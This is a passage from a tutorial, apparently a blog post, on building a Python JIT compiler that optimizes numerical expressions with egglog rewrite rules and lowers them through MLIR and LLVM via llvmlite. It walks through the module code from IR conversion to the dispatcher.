Cos(Symbol(\"y\"))\n\nThis symbolic interpretation is what allows us to capture Python computations in a form that can be optimized using our e-graph machinery.\nIR Conversion (ir_to_mlir.py)\nThe IR to MLIR conversion layer serves as a crucial bridge between our high-level expression representation and MLIR's lower-level dialect. This conversion process is implemented in ir_to_mlir.py and involves several steps that leverage Python's dynamic execution capabilities along with AST manipulation.\nThe conversion pipeline begins with the convert_term_to_expr function, which transforms an IR term into our internal expression model. This function employs Python's built-in ast module to parse and manipulate the abstract syntax tree of the term. The process is particularly interesting because it uses Python's execution environment as part of the conversion process.\nWhen a term arrives for conversion, it first goes through AST parsing. The function creates a Python AST from the string representation of the term, which allows us to manipulate the code structure before execution. A key part of this process is the mangle_assignment function, which ensures the result of the expression is properly captured in a variable named _out. This mangling step is crucial because it provides a way to extract the final result from the execution environment.\nThe execution environment is carefully constructed using a function_map dictionary that maps operation names to their corresponding implementations. This map includes basic arithmetic operations (Add, Sub, Mul, Div), mathematical functions (Sin, Cos, Exp, Log), and type conversion operations (CastF32, CastI64). Each of these operations is mapped to either a method from our expression model or a function from our builtin functions module.\nThe second major component is the convert_term_to_mlir function, which takes the converted expression and generates MLIR code. This function handles the final transformation into MLIR's textual format. It processes function arguments through the argspec parameter, creating a mapping between argument names and their MLIR representations (e.g., converting x to %arg_x). The actual MLIR generation is delegated to the MLIRGen class, which walks through the expression tree and produces corresponding MLIR operations.\nFor example, when converting a simple arithmetic expression like a + b * c, the pipeline would:\n\nParse the expression into an AST\nTransform it into our internal expression model using the function map\nGenerate MLIR code with proper memory references and operations\nWrap the operations in a proper MLIR function structure with appropriate type annotations\n\ndef convert_term_to_expr(tree: IRTerm) -> ir.Expr:\n    \"\"\"\n    Convert a term to an expression.\n    \"\"\"\n\n    # Parse the term into an AST\n    astree = ast.parse(str(tree))\n\n    # Mangle the assignment\n    astree.body[-1] = ast.fix_missing_locations(mangle_assignment(astree.body[-1]))  # type: ignore\n\n    # Execute the AST\n    globals: dict[str, Any] = {}\n    exec(compile(astree, \"<string>\", \"exec\"), function_map, globals)\n\n    # Get the result\n    result = globals[\"_out\"]\n    return result\n\ndef convert_term_to_mlir(tree: IRTerm, argspec: str) -> str:\n    \"\"\"\n    Convert a term to MLIR.\n    \"\"\"\n\n    expr = convert_term_to_expr(tree)\n    argnames = map(lambda x: x.strip(), argspec.split(\",\"))\n    argmap = {k: f\"%arg_{k}\" for k in argnames}\n    source = MLIRGen(expr, argmap).generate()\n    return source\nOptimization Layer\nNow we can start to write our own rewrite rules to apply over our expression tree.\nThe birewrite_subsume helper function is a generator that yields rewrite rules for the e-graph. It takes two terms and yields a rewrite rule that converts the first term to the second, making the first term unable to be matched against or extracted. We use this to unidirectionally convert generic Terms into specialized binary and unary operations.\ndef birewrite_subsume(a: Term, b: Term) -> Generator[RewriteOrRule, None, None]:\n    yield rewrite(a, subsume=True).to(b)\n    yield rewrite(b).to(a)\nThe basic simplification module implements fundamental mathematical rewrites that form the foundation of our term rewriting system. These rules are organized in the basic_math ruleset and include several key categories of transformations:\n\nTerm Translation Rules: These rules allow conversion between generic Terms and their specialized forms (Add, Mul, Div, Pow)\nIdentity Rules: Rules for handling mathematical identities like x+0=xx + 0 = xx+0=x and x⋅1=xx \\cdot 1 = xx⋅1=x\nAssociativity Rules: Rules that handle the associative properties of operations like (x+y)+z=x+(y+z)(x + y) + z = x + (y + z)(x+y)+z=x+(y+z)\nPower Rules: Special handling for powers, including cases like x0=1x^0 = 1x0=1 and x1=xx^1 = xx1=x\nArithmetic Simplification: Rules that simplify common arithmetic patterns like x+x=2⋅xx + x = 2 \\cdot xx+x=2⋅x\n\nEach rule is implemented using egglog's rewrite system.\nfrom mlir_egglog.term_ir import Term, Add, Mul, Div, Pow, PowConst, birewrite_subsume\nfrom egglog import RewriteOrRule, ruleset, rewrite, i64, f64\nfrom typing import Generator\n\n@ruleset\ndef basic_math(\n    x: Term, y: Term, z: Term, i: i64, f: f64\n) -> Generator[RewriteOrRule, None, None]:\n    # Allow us to translate Term into their specializations\n    yield from birewrite_subsume(x + y, Add(x, y))\n    yield from birewrite_subsume(x * y, Mul(x, y))\n    yield from birewrite_subsume(x / y, Div(x, y))\n    yield from birewrite_subsume(x**y, Pow(x, y))\n\n    # x + 0 = x (integer case)\n    yield rewrite(Add(x, Term.lit_i64(0))).to(x)\n    # x + 0.0 = x (float case)\n    yield rewrite(Add(x, Term.lit_f32(0.0))).to(x)\n    # 0.0 + x = x (float case)\n    yield rewrite(Add(Term.lit_f32(0.0), x)).to(x)\n\n    # x * 1 = x\n    yield rewrite(Mul(x, Term.lit_i64(1))).to(x)\n\n    # x * 0 = 0\n    yield rewrite(Mul(x, Term.lit_i64(0))).to(Term.lit_i64(0))\n\n    # (x + y) + z = x + (y + z)\n    yield rewrite(Add(x, Add(y, z))).to(Add(Add(x, y), z))\n\n    # (x * y) * z = x * (y * z)\n    yield rewrite(Mul(x, Mul(y, z))).to(Mul(Mul(x, y), z))\n\n    # x + x = 2 * x\n    yield rewrite(Add(x, x)).to(Mul(Term.lit_i64(2), x))\n\n    # x * x = x^2\n    yield rewrite(Mul(x, x)).to(Pow(x, Term.lit_i64(2)))\n\n    # (x^y) * (x^z) = x^(y + z)\n    yield rewrite(Pow(x, y) * Pow(x, z)).to(Pow(x, Add(y, z)))\n\n    # x^i = x * x^(i - 1)\n    yield rewrite(Pow(x, Term.lit_i64(i))).to(PowConst(x, i))\n\n    # x^0 = 1\n    yield rewrite(PowConst(x, 0)).to(Term.lit_f32(1.0))\n\n    # x^1 = x\n    yield rewrite(PowConst(x, 1)).to(x)\n\n    # x^i = x * x^(i - 1)\n    yield rewrite(PowConst(x, i)).to(Mul(x, PowConst(x, i - 1)), i > 1)\nSimilar to the basic simplification module, the trigonometric simplification module provides a comprehensive set of rules for simplifying expressions involving trigonometric and hyperbolic functions. The trig_simplify ruleset implements several important categories of transformations:\n\nFundamental Identities: Core trigonometric identities like sin⁡2(x)+cos⁡2(x)=1\\sin^2(x) + \\cos^2(x) = 1sin2(x)+cos2(x)=1\nDouble Angle Formulas: Rules for simplifying expressions like sin⁡(x+y)\\sin(x + y)sin(x+y) and cos⁡(x+y)\\cos(x + y)cos(x+y)\nHyperbolic Identities: Similar rules for hyperbolic functions, including identities for sinh⁡\\sinhsinh, cosh⁡\\coshcosh, and tanh⁡\\tanhtanh\n\nThese rules are particularly important for optimizing numerical computations involving trigonometric functions, which are common in scientific computing and machine learning applications. The module carefully balances the tradeoff between expression simplification and computational efficiency, using the cost model defined in the Term IR to guide its decisions.\nfrom mlir_egglog.term_ir import Sin, Cos, Sinh, Cosh, Tanh, Term, Pow, Add\nfrom egglog import ruleset, i64, f64\nfrom egglog import rewrite\n\n@ruleset\ndef trig_simplify(x: Term, y: Term, z: Term, i: i64, fval: f64):\n    # Fundamental trig identities\n    # sin²(x) + cos²(x) = 1\n    two = Term.lit_i64(2)\n    yield rewrite(Add(Pow(Sin(x), two), Pow(Cos(x), two))).to(Term.lit_f32(1.0))\n\n    # Double angle formulas\n    yield rewrite(Sin(x + y)).to(Sin(x) * Cos(y) + Cos(x) * Sin(y))\n    yield rewrite(Sin(x - y)).to(Sin(x) * Cos(y) - Cos(x) * Sin(y))\n    yield rewrite(Cos(x + y)).to(Cos(x) * Cos(y) - Sin(x) * Sin(y))\n    yield rewrite(Cos(x - y)).to(Cos(x) * Cos(y) + Sin(x) * Sin(y))\n\n    # Hyperbolic identities\n    yield rewrite(Sinh(x) * Cosh(y) + Cosh(y) * Sinh(x)).to(Sinh(x + y))\n    yield rewrite(Cosh(x) * Cosh(y) + Sinh(x) * Sinh(y)).to(Cosh(x + y))\n    yield rewrite((Tanh(x) + Tanh(y)) / (Term.lit_i64(1) + Tanh(x) * Tanh(y))).to(\n        Tanh(x + y)\n    )\nEgglog Optimizer (egglog_optimizer.py)\nThe optimization engine ties together all the rewrite rules and provides the main interface for applying optimizations to Python functions. It consists of several key components:\n\nRule Composition: The ability to combine multiple rulesets either sequentially or in parallel\nExpression Extraction: Logic for converting between the Python AST and the term representation\nOptimization Pipeline: A structured approach to applying rules until reaching a fixed point\nMLIR Generation: Final conversion of the optimized expression to MLIR code\n\nThe optimizer uses the e-graph data structure to efficiently explore equivalent expressions and find the most cost-effective implementation according to our cost model.\nimport inspect\nfrom types import FunctionType\n\nfrom egglog import EGraph, RewriteOrRule, Ruleset\nfrom egglog.egraph import UnstableCombinedRuleset\n\nfrom mlir_egglog.term_ir import Term, as_egraph\nfrom mlir_egglog.python_to_ir import interpret\nfrom mlir_egglog import builtin_functions as ns\nfrom mlir_egglog.expr_model import Expr\nfrom mlir_egglog.ir_to_mlir import convert_term_to_mlir\n\n# Rewrite rules\nfrom mlir_egglog.basic_simplify import basic_math\nfrom mlir_egglog.trig_simplify import trig_simplify\n\nOPTS: tuple[Ruleset | RewriteOrRule, ...] = (basic_math, trig_simplify)\n\ndef extract(ast: Expr, rules: tuple[RewriteOrRule | Ruleset, ...], debug=False) -> Term:\n    root = as_egraph(ast)\n\n    egraph = EGraph()\n    egraph.let(\"root\", root)\n\n    # The user can compose rules as (rule1 | rule2) to apply them in parallel\n    # or (rule1, rule2) to apply them sequentially\n    for opt in rules:\n        if isinstance(opt, Ruleset):\n            egraph.run(opt.saturate())\n        elif isinstance(opt, UnstableCombinedRuleset):\n            egraph.run(opt.saturate())\n        else:\n            # For individual rules, create a temporary ruleset\n            temp_ruleset = Ruleset(\"temp\")\n            temp_ruleset.append(opt)\n            egraph.run(temp_ruleset.saturate())\n\n    extracted = egraph.extract(root)\n\n    # if debug:\n    #     egraph.display()\n\n    return extracted\n\ndef compile(\n    fn: FunctionType, rewrites: tuple[RewriteOrRule | Ruleset, ...] = OPTS, debug=True\n) -> str:\n    # Convert np functions accordinging to the namespace map\n    exprtree = interpret(fn, {\"np\": ns})\n    extracted = extract(exprtree, rewrites, debug)\n\n    # Get the argument spec\n    argspec = inspect.signature(fn)\n    params = \",\".join(map(str, argspec.parameters))\n\n    return convert_term_to_mlir(extracted, params)\nThese modules work together to provide a powerful system for optimizing mathematical expressions, particularly those involving trigonometric and transcendental functions. The system is extensible, allowing new rules to be added easily, and provides a solid foundation for building more specialized optimizations on top.\nThe egglog optimizer supports two ways to compose rewrite rules: parallel and sequential composition. When rules are combined using the | operator (parallel composition), they are applied simultaneously in the same iteration of the e-graph saturation process. This allows multiple transformations to be explored concurrently. In contrast, when rules are combined using a tuple or sequence (sequential composition), they are applied one after another, with each rule set running to saturation before moving to the next. This sequential approach can be useful when certain transformations should only be attempted after others have completed.\n# Example 1: Parallel Composition\n# Both rulesets are applied simultaneously in each iteration\nparallel_rules = simplify_adds | simplify_muls\negraph = EGraph()\negraph.run(parallel_rules.saturate())\n\n# Example 2: Sequential Composition\n# simplify_adds runs to completion before simplify_muls starts\nsequential_rules = (simplify_adds, simplify_muls)\negraph = EGraph()\nfor ruleset in sequential_rules:\n    egraph.run(ruleset.saturate())\nMLIR Generation (mlir_gen.py)\nThe MLIR code generator is responsible for transforming our optimized expression trees into executable MLIR code. The generator follows a systematic approach to produce vectorized kernels that can efficiently process N-dimensional arrays. Let's examine the key components and design principles:\nThe generator produces a function that follows this template:\nfunc.func @kernel_worker(\n    %arg0: memref<?xf32>,\n    %arg1: memref<?xf32>\n) {\n    // Kernel body\n}\nThe generated kernel accepts two memref arguments - an input and output buffer - and processes them element-wise using affine loops. This design allows for efficient vectorized operations on arrays of any dimension.\nfunc.func @kernel_worker(\n    %arg0: memref<?xf32>,\n    %arg1: memref<?xf32>\n) attributes {llvm.emit_c_interface} {\n    %c0 = arith.constant 0 : index\n\n    // Get dimension of input array\n    %dim = memref.dim %arg0, %c0 : memref<?xf32>\n\n    // Process each element in a flattened manner\n    affine.for %idx = %c0 to %dim {\n        // Kernel body\n    }\n    return\n}\nExpression Translation\nThe MLIRGen class implements a multi-pass translation strategy that begins with subexpression expansion, where the generator unfolds the expression tree into a complete set of subexpressions using the unfold method. This process ensures that common subexpressions are identified and can be reused. Next, the generator employs topological ordering, sorting subexpressions by complexity, using string length as a proxy to ensure that simpler expressions are evaluated before more complex ones that might depend on them. Finally, the code generation pipeline is executed, which first loads input variables from the memref, generates intermediate computations for subexpressions, and stores the final result back to the output memref.\nThe generator employs a smart caching mechanism to avoid redundant computations:\ndef walk(self, expr: ir.Expr):\n    if expr in self.cache:\n        return\n    def lookup(e):\n        return self.cache.get(e) or as_source(e, self.vars, lookup)\n    self.cache[expr] = as_source(expr, self.vars, lookup)\nThis caching strategy ensures that each subexpression is computed exactly once, common subexpressions are reused through MLIR's SSA (Static Single Assignment) form, and the generated code maintains optimal efficiency.\nMLIR Dialect Usage\nOur generator then walks over the expression tree and maps our high-level expressions to appropriate MLIR dialects:\n\nArithmetic operations use the arith dialect (e.g., arith.addf, arith.mulf)\nMathematical functions use the math dialect (e.g., math.sin, math.exp)\nMemory operations use the memref dialect for array access\nLoop structures use the affine dialect for optimized iteration\n\nFor example, a Python expression like sin(x) + cos(y) would be translated into:\n%a0 = math.sin %arg_x : f32\n%a1 = math.cos %arg_y : f32\n%a2 = arith.addf %a0, %a1 : f32\nThe generator handles type conversions automatically, standardizing floating-point operations to f32 and using i32 or i64 for integer operations as appropriate. When needed, explicit type casts are generated, such as arith.sitofp for converting integers to floating-point values. This type system ensures type safety while maintaining compatibility with MLIR's strong typing requirements.\nfrom textwrap import indent\nfrom typing import Callable\nfrom mlir_egglog import expr_model as ir\n\nKERNEL_NAME = \"kernel_worker\"\n\n# Numpy vectorized kernel that supports N-dimensional arrays\nkernel_prologue = f\"\"\"\nfunc.func @{KERNEL_NAME}(\n    %arg0: memref<?xf32>,\n    %arg1: memref<?xf32>\n) attributes {{llvm.emit_c_interface}} {{\n    %c0 = arith.constant 0 : index\n\n    // Get dimension of input array\n    %dim = memref.dim %arg0, %c0 : memref<?xf32>\n\n    // Process each element in a flattened manner\n    affine.for %idx = %c0 to %dim {{\n\"\"\"\n\nkernel_epilogue = \"\"\"\n    }\n    return\n}\n\"\"\"\n\nclass MLIRGen:\n    \"\"\"\n    Generate textual MLIR from a symbolic expression.\n    \"\"\"\n\n    root: ir.Expr\n    cache: dict[ir.Expr, str]\n    subexprs: dict[str, str]\n    vars: list[str]  # local variables\n\n    def __init__(self, root: ir.Expr, argmap: dict[str, str]):\n        # Use the keys from argmap as the variable names\n        self.root = root\n        self.cache = {}\n        self.vars = list(argmap.keys())\n        self.subexprs = {}\n\n    def generate(self):\n        \"\"\"\n        Generate MLIR code for the root expression.\n        \"\"\"\n        subexprs = list(self.unfold(self.root))\n        subexprs.sort(key=lambda x: len(str(x)))\n\n        buf = []\n        # First load input arguments from memref\n        for var in self.vars:\n            buf.append(f\"%arg_{var} = affine.load %arg0[%idx] : memref<?xf32>\")\n\n        for i, subex in enumerate(subexprs):\n            # Skip if this is just a variable reference\n            if isinstance(subex, ir.Symbol) and subex.name in self.vars:\n                continue\n\n            # Recurse and cache the subexpression\n            self.walk(subex)\n            orig = self.cache[subex]\n\n            # Generate a unique name for the subexpression\n            k = f\"%v{i}\"\n            self.cache[subex] = k\n            self.subexprs[k] = orig\n\n            # Append the subexpression to the buffer\n            buf.append(f\"{k} = {orig}\")\n\n        self.walk(self.root)\n        res = self.cache[self.root]\n\n        # Handle the output\n        buf.append(f\"affine.store {res}, %arg1[%idx] : memref<?xf32>\")\n\n        # Format the kernel body\n        kernel_body = indent(\"\\n\".join(buf), \"    \" * 2)\n        return kernel_prologue + kernel_body + kernel_epilogue\n\n    def unfold(self, expr: ir.Expr):\n        \"\"\"\n        Unfold an expression into a set of subexpressions.\n        \"\"\"\n        visited = set()\n        all_subexprs = set()\n        to_visit = [expr]\n        while to_visit:\n            current = to_visit.pop()\n            all_subexprs.add(current)\n            if current in visited:\n                continue\n            visited.add(current)\n            to_visit.extend(get_children(current))\n\n        return all_subexprs\n\n    def walk(self, expr: ir.Expr):\n        \"\"\"\n        Walk an expression recursively and generate MLIR code for subexpressions,\n        caching the intermediate expressions in a lookup table.\n        \"\"\"\n        if expr in self.cache:\n            return\n\n        def lookup(e):\n            return self.cache.get(e) or as_source(e, self.vars, lookup)\n\n        self.cache[expr] = as_source(expr, self.vars, lookup)\n\ndef get_children(expr: ir.Expr):\n    \"\"\"Get child expressions for an AST node.\"\"\"\n    match expr:\n        case ir.BinaryOp():\n            return {expr.lhs, expr.rhs}\n        case ir.UnaryOp():\n            return {expr.operand}\n        case ir.FloatLiteral() | ir.IntLiteral() | ir.Symbol():\n            return set()\n        case _:\n            raise NotImplementedError(f\"Unsupported expression type: {type(expr)}\")\n\ndef as_source(\n    expr: ir.Expr, vars: list[str], lookup_fn: Callable[[ir.Expr], str]\n) -> str:\n    \"\"\"\n    Convert expressions to MLIR source code using arith and math dialects.\n    \"\"\"\n    match expr:\n        # Literals and Symbols\n        case ir.FloatLiteral(fval=val):\n            return f\"arith.constant {val:e} : f32\"\n        case ir.IntLiteral(ival=val):\n            return f\"arith.constant {val} : i32\"\n        case ir.Symbol(name=name) if name in vars:\n            return f\"%arg_{name}\"\n        case ir.Symbol(name=name):\n            return f\"%{name}\"\n\n        # Binary Operations\n        case ir.Add(lhs=lhs, rhs=rhs):\n            return f\"arith.addf {lookup_fn(lhs)}, {lookup_fn(rhs)} : f32\"\n        case ir.Mul(lhs=lhs, rhs=rhs):\n            return f\"arith.mulf {lookup_fn(lhs)}, {lookup_fn(rhs)} : f32\"\n        case ir.Div(lhs=lhs, rhs=rhs):\n            return f\"arith.divf {lookup_fn(lhs)}, {lookup_fn(rhs)} : f32\"\n        case ir.Maximum(lhs=lhs, rhs=rhs):\n            return f\"arith.maximumf {lookup_fn(lhs)}, {lookup_fn(rhs)} : f32\"\n\n        # Unary Math Operations\n        case (\n            ir.Sin()\n            | ir.Cos()\n            | ir.Log()\n            | ir.Sqrt()\n            | ir.Exp()\n            | ir.Sinh()\n            | ir.Cosh()\n            | ir.Tanh()\n        ) as op:\n            op_name = type(op).__name__.lower()\n            return f\"math.{op_name} {lookup_fn(op.operand)} : f32\"\n        case ir.Neg(operand=op):\n            return f\"arith.negf {lookup_fn(op)} : f32\"\n\n        # Type Casting\n        case ir.CastF32(operand=op):\n            return f\"arith.sitofp {lookup_fn(op)} : i64 to f32\"\n        case ir.CastI64(operand=op):\n            return f\"arith.fptosi {lookup_fn(op)} : f32 to i64\"\n\n        case _:\n            raise NotImplementedError(f\"Unsupported expression type: {type(expr)}\")\nMLIR Backend (mlir_backend.py)\nThe MLIR backend to our compiler is responsible for transforming our high-level MLIR code through various lowering stages until it reaches LLVM IR and finally executable code. Let's walk through the key components and design principles:\nThe backend supports two primary compilation targets:\nclass Target(enum.Enum):\n    OPENMP = \"openmp\"      # Parallel execution using OpenMP\n    BASIC_LOOPS = \"loops\"  # Sequential execution with basic loops\nThis allows the compiler to generate either parallel code using OpenMP for multi-threaded execution or simpler sequential code depending on the application's needs.\nThe compilation process is organized into several distinct phases, each applying specific MLIR optimization passes:\nCommon Initial Transformations:\nCOMMON_INITIAL_OPTIONS = (\n    \"--debugify-level=locations\",\n    \"--inline\",\n    \"-affine-loop-normalize\",\n    \"-affine-parallelize\",\n    \"-affine-super-vectorize\",\n    \"--affine-scalrep\",\n    \"-lower-affine\",\n    \"-convert-vector-to-scf\",\n    \"-convert-linalg-to-loops\",\n)\nThese passes handle function inlining, loop normalization, vectorization, and initial dialect conversions.\nTarget-Specific Lowering:\n\nOpenMP Path: Converts structured control flow to OpenMP operations and then to LLVM\n\nOPENMP_OPTIONS = (\n    \"-convert-scf-to-openmp\",\n    \"-convert-openmp-to-llvm\",\n    \"-convert-vector-to-llvm\",\n    \"-convert-math-to-llvm\",\n    # ... additional lowering passes\n)\n\nBasic Loops Path: Direct conversion to sequential LLVM IR\n\nBASIC_LOOPS_OPTIONS = (\n    \"-convert-scf-to-cf\",\n    \"-convert-vector-to-llvm\",\n    \"-convert-math-to-llvm\",\n    # ... additional lowering passes\n)\nFinal LLVM IR Generation:\nMLIR_TRANSLATE_OPTIONS = (\n    \"--mlir-print-local-scope\",\n    \"--mlir-to-llvmir\",\n    \"--verify-diagnostics\",\n)\nThe MLIRCompiler class orchestrates the entire compilation process through three main stages:\nMLIR to LLVM Dialect (to_llvm_dialect):\n\nConverts high-level MLIR operations to the LLVM dialect\nApplies target-specific optimizations (OpenMP or basic loops)\nHandles memory layout and type conversions\n\nLLVM Dialect to LLVM IR (mlir_translate_to_llvm_ir):\n\nTranslates the LLVM dialect representation to textual LLVM IR\nPreserves debug information and verifies the generated code\n\nLLVM IR to Bitcode (llvm_ir_to_bitcode):\n\nConverts textual LLVM IR to binary LLVM bitcode\nPrepares the code for final execution\n\nThe backend uses temporary files for intermediate representations and provides debugging capabilities through the debug flag:\ndef _run_shell(self, cmd, in_mode, out_mode, src):\n    with (\n        NamedTemporaryFile(mode=f\"w{in_mode}\") as src_file,\n        NamedTemporaryFile(mode=f\"r{out_mode}\") as out_file,\n    ):\n        # Execute compilation command and handle I/O\nThen the compiler spit out the LLVM IR and we can use the llvmlite library to load it and execute it inside of the Python process, allowing us to dynamically load the compiled machine code.\nLLVM Runtime (llvm_runtime.py)\nThe LLVM runtime provides the final layer of our compilation pipeline, handling the dynamic loading and execution of compiled LLVM code within Python. This component uses llvmlite to interface with LLVM and manages the Just-In-Time (JIT) compilation process.\nLLVM Initialization\nThe runtime begins with a cached initialization of LLVM components:\n@cache\ndef init_llvm():\n    llvm.initialize()\n    llvm.initialize_all_targets()\n    llvm.initialize_all_asmprinters()\nThis initialization is cached to ensure it occurs only once per Python session, which sets up the core LLVM functionality, all available target architectures, and the assembly printers necessary for code generation.\nThe runtime creates an LLVM execution engine that manages the JIT compilation process:\ndef create_execution_engine():\n    target = llvm.Target.from_default_triple()\n    target_machine = target.create_target_machine()\n    backing_mod = llvm.parse_assembly(\"\")\n    engine = llvm.create_mcjit_compiler(backing_mod, target_machine)\n    return engine\nThis setup determines the host machine's target architecture, creates a target machine instance for code generation, initializes an empty LLVM module as a backing store, and creates an MCJIT compiler instance for optimized code execution.\nThe runtime provides two levels of module compilation:\nDirect Module Compilation:\ndef compile_mod(engine, mod):\n    mod.verify()                     # Verify module correctness\n    engine.add_module(mod)           # Add to execution engine\n    engine.finalize_object()         # Finalize compilation\n    engine.run_static_constructors() # Initialize static data\n    return mod\nIR String Compilation:\ndef compile_ir(engine, llvm_ir):\n    mod = llvm.parse_assembly(llvm_ir)  # Parse IR text\n    return compile_mod(engine, mod)      # Compile module\nThis runtime layer bridges the gap between LLVM's low-level compilation infrastructure and Python's high-level execution environment, allowing our compiled kernels to run efficiently within the Python process.\nimport llvmlite.binding as llvm\nimport llvmlite\nfrom functools import cache\n\n@cache\ndef init_llvm():\n    print(llvmlite.__version__)\n    llvm.initialize()\n    llvm.initialize_all_targets()\n    llvm.initialize_all_asmprinters()\n\ndef compile_mod(engine, mod):\n    mod.verify()\n    engine.add_module(mod)\n    engine.finalize_object()\n    engine.run_static_constructors()\n    return mod\n\ndef create_execution_engine():\n    target = llvm.Target.from_default_triple()\n    target_machine = target.create_target_machine()\n    backing_mod = llvm.parse_assembly(\"\")\n    engine = llvm.create_mcjit_compiler(backing_mod, target_machine)\n    return engine\n\ndef compile_ir(engine, llvm_ir):\n    mod = llvm.parse_assembly(llvm_ir)\n    return compile_mod(engine, mod)\nJIT Engine (jit_engine.py)\nThe jit_engine.py module is the orchestrator of our compiler pipeline, tying together all the components into a seamless compilation process. It manages the entire lifecycle from Python function to executable machine code, handling optimization, code generation, and runtime execution.\nThe JITEngine class provides three main levels of compilation:\nFrontend Compilation (run_frontend):\ndef run_frontend(\n    self,\n    fn: FunctionType,\n    rewrites: tuple[RewriteOrRule | Ruleset, ...] | None = None,\n) -> str:\nThe run_frontend method takes a Python function along with optional rewrite rules, applies the egglog optimizer to perform term rewriting, and generates optimized MLIR code.\nBackend Compilation (run_backend):\ndef run_backend(self, mlir_src: str) -> bytes:\n    mlir_compiler = MLIRCompiler(debug=False)\n    mlir_omp = mlir_compiler.to_llvm_dialect(mlir_src)\n    llvm_ir = mlir_compiler.mlir_translate_to_llvm_ir(mlir_omp)\nThe run_backend method converts MLIR to the LLVM dialect, translates it to LLVM IR, handles platform-specific optimizations, and ultimately returns the address of the compiled function.\nFull JIT Compilation (jit_compile):\ndef jit_compile(\n    self,\n    fn: FunctionType,\n    rewrites: tuple[RewriteOrRule | Ruleset, ...] | None = None,\n) -> bytes:\n    mlir = self.run_frontend(fn, rewrites)\n    address = self.run_backend(mlir)\n    return address\nThe jit_compile method combines both frontend and backend compilation, providing a single entry point for the entire compilation process.\nIn order to use the OpenMP rutnime we need to load the system-specific OpenMP library into the Python process. Which we can do through the ctypes library once we know the corect path of the shared library.\ndef find_omp_path():\n    if sys.platform.startswith(\"linux\"):\n        omppath = ctypes.util.find_library(\"libgomp.so\")\n    elif sys.platform.startswith(\"darwin\"):\n        omppath = ctypes.util.find_library(\"iomp5\")\n    else:\n        raise RuntimeError(f\"Unsupported platform: {sys.platform}\")\n    return omppath\nThe engine handles several critical LLVM-related tasks:\nInitialization:\ndef __init__(self):\n    init_llvm()\n    omppath = find_omp_path()\n    ctypes.CDLL(omppath, mode=os.RTLD_NOW)\n    self.ee = create_execution_engine()\n\nInitializes LLVM infrastructure\nLoads OpenMP runtime\nCreates the execution engine\n\nThe class serves as the glue that binds our compiler's components together, providing an interface between Python code and optimized machine code execution. It handles the complexity of multi-stage compilation, platform-specific requirements, and runtime optimization.\nfrom __future__ import annotations\n\nimport ctypes\nimport ctypes.util\nimport os\nimport sys\nfrom types import FunctionType\nfrom egglog import RewriteOrRule, Ruleset\n\nimport llvmlite.binding as llvm\n\nfrom mlir_egglog.llvm_runtime import (\n    create_execution_engine,\n    init_llvm,\n    compile_mod,\n)\nfrom mlir_egglog.mlir_gen import KERNEL_NAME\nfrom mlir_egglog.mlir_backend import MLIRCompiler, Target\nfrom mlir_egglog.egglog_optimizer import compile, OPTS\n\ndef find_omp_path():\n    if sys.platform.startswith(\"linux\"):\n        omppath = ctypes.util.find_library(\"libgomp.so\")\n    elif sys.platform.startswith(\"darwin\"):\n        omppath = ctypes.util.find_library(\"iomp5\")\n    else:\n        raise RuntimeError(f\"Unsupported platform: {sys.platform}\")\n    return omppath\n\nclass JITEngine:\n    def __init__(self):\n        init_llvm()\n        omppath = find_omp_path()\n        ctypes.CDLL(omppath, mode=os.RTLD_NOW)\n\n        self.ee = create_execution_engine()\n\n    def run_frontend(\n        self,\n        fn: FunctionType,\n        rewrites: tuple[RewriteOrRule | Ruleset, ...] | None = None,\n    ) -> str:\n        actual_rewrites = rewrites if rewrites is not None else OPTS\n        return compile(fn, rewrites=actual_rewrites, debug=False)\n\n    def run_backend(self, mlir_src: str) -> bytes:\n        mlir_compiler = MLIRCompiler(debug=False)\n\n        mlir_omp = mlir_compiler.to_llvm_dialect(mlir_src, target=Target.BASIC_LOOPS)\n        llvm_ir = mlir_compiler.mlir_translate_to_llvm_ir(mlir_omp)\n\n        print(llvm_ir)\n        print(\"Parsing LLVM assembly.\")\n\n        try:\n            # Clean up the LLVM IR by ensuring proper line endings and formatting\n            llvm_ir = llvm_ir.strip()\n\n            # Clean up problematic attribute strings (hack for divergence in modern LLVM IR syntax with old llvmlite)\n            llvm_ir = llvm_ir.replace(\"captures(none)\", \" \")\n            llvm_ir = llvm_ir.replace(\"memory(argmem: readwrite)\", \"\")\n            llvm_ir = llvm_ir.replace(\"memory(none)\", \"\")\n            llvm_ir += \"\\n\"\n\n            mod = llvm.parse_assembly(llvm_ir)\n            mod = compile_mod(self.ee, mod)\n\n            # Resolve the function address\n            func_name = f\"_mlir_ciface_{KERNEL_NAME}\"\n            address = self.ee.get_function_address(func_name)\n\n            assert address, \"Function must be compiled successfully.\"\n            return address\n        except Exception as e:\n            print(f\"Error during LLVM IR parsing/compilation: {str(e)}\")\n            print(\"LLVM IR that failed to parse:\")\n            print(llvm_ir)\n            raise\n\n    def jit_compile(\n        self,\n        fn: FunctionType,\n        rewrites: tuple[RewriteOrRule | Ruleset, ...] | None = None,\n    ) -> bytes:\n        mlir = self.run_frontend(fn, rewrites)\n        address = self.run_backend(mlir)\n        return address\nDispatcher (dispatcher.py)\nThe Dispatcher serves as the user-facing interface of our compiler, providing a decorator to transform regular Python functions into optimized vectorized kernels. It handles the compilation process and manages the execution of compiled functions.\nThe Dispatcher class manages the lifecycle of compiled functions:\nclass Dispatcher:\n    _compiled_func: bytes | None      # Compiled function address\n    _compiler: JITEngine | None       # JIT compilation engine\n    py_func: types.FunctionType       # Original Python function\n    rewrites: tuple[RewriteOrRule, ...] | None  # Optimization rules\nThe compilation process is handled through a simple interface by invoking the compiler's jit_compile method.\ndef compile(self):\n    self._compiler = JITEngine()\n    binary = self._compiler.jit_compile(self.py_func, self.rewrites)\n    self._compiled_func = binary\n    return binary\nThis method creates a new JIT engine instance, compiles the Python function with the specified rewrites, and stores the compiled binary for future execution. The dispatcher implements a cached calling mechanism to avoid recompiling the function on subsequent calls. When we call our compiled function with a numpy array the dispatcher will retreives the underlying input arrays and allocates a new empty output array of the same shape. Then it will convert the numpy array to a memref descriptor and pass it to the compiled function.\ndef __call__(self, *args, **kwargs):\n    # Get the input array and its shape\n    input_array = args[0]\n    original_shape = input_array.shape\n\n    # Flatten the input array\n    flattened_input = input_array.flatten()\n    flattened_output = np.empty_like(flattened_input)\n\n    # Convert to memrefs\n    memrefs = [\n        as_memref_descriptor(flattened_input, ctypes.c_float),\n        as_memref_descriptor(flattened_output, ctypes.c_float)\n    ]\nThe dispatcher then lookups the function pointer from the MCJIT compiled memory and calls it with the memref descriptors as arguments.\n# Create function prototype for ctypes\nprototype = ctypes.CFUNCTYPE(None, 